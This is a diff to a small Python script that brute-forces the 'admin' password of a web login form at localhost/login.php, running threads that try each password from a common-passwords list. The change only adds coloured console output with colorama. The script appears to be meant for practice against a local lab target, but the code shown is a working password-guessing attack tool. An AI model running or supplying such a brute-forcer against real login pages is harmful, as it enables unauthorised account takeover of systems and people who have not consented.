@@ -2,6 +2,7 @@
 
 import threading
 import requests
+from colorama import init, Fore
 
 URL = 'http://localhost/login.php'
 PASSWORD_FILE_NAME = 'common-passwords.txt'
@@ -36,14 +37,14 @@ def run_cracker(*passwords):
 
 
 def crack_password(password):
-    print('[*] Trying password: "{}" ...'.format(password))
+    print(Fore.BLUE + '[*] Trying password: "{}" ...'.format(password))
     response = requests.post(
         URL,
         data={'username': 'admin', 'Login': 'Login', 'password': password}
     )
 
     if bytes('Login failed', encoding='utf-8') not in response.content:
-        print('[*] Login successful for username: {} password: {}'.format(
+        print(Fore.GREEN + '[*] Login successful for username: {} password: {}'.format(
             'admin', password
         ))
         return True
@@ -52,15 +53,16 @@ def crack_password(password):
 
 
 if __name__ == '__main__':
+    init()
     with open(PASSWORD_FILE_NAME) as password_file:
         passwords = password_file.readlines()
 
     thread_list = create_threads(passwords)
 
     for thread in thread_list:
-        print('[*] Running thread: {}.'.format(thread.getName()))
+        print(Fore.RED + '[*] Running thread: {}.'.format(thread.getName()))
         thread.start()
 
     for thread in thread_list:
-        print('[*] Wating for {} to join.'.format(thread.getName()))
+        print(Fore.RED + '[*] Wating for {} to join.'.format(thread.getName()))
         thread.join()
